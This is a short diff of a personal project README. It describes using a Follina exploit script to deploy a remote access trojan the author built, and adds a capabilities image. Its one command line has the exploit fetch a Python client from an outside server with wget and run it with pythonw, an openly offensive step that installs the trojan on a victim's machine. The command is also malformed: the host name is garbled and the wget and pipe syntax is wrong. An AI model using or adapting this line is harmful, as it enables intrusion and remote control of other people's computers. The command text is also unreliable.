@@ -1,9 +1,14 @@
-## Using this to deploy the remote access trojan I made
+## Using the vulnerability to deploy the remote access trojan I made as shown below
 > python3 follina.py -c "wget -o 'client.py' https://.source-code-server./Client.py | pythonw client.py"
 
 
 ### [Remote-Access Trojan](https://lissankoirala.ml/projects/remote-access)
 <img src="https://github.com/LissanKoirala/LissanKoirala/blob/main/trojan-globe.gif" alt="drawing" with="100"/>
+
+#### Capabilities
+![capabilities](https://user-images.githubusercontent.com/58141138/171510409-4f7cb5bd-34df-43e8-8c18-41dcada4cbd6.png)
+
+
 Not Open Sourced
 
 
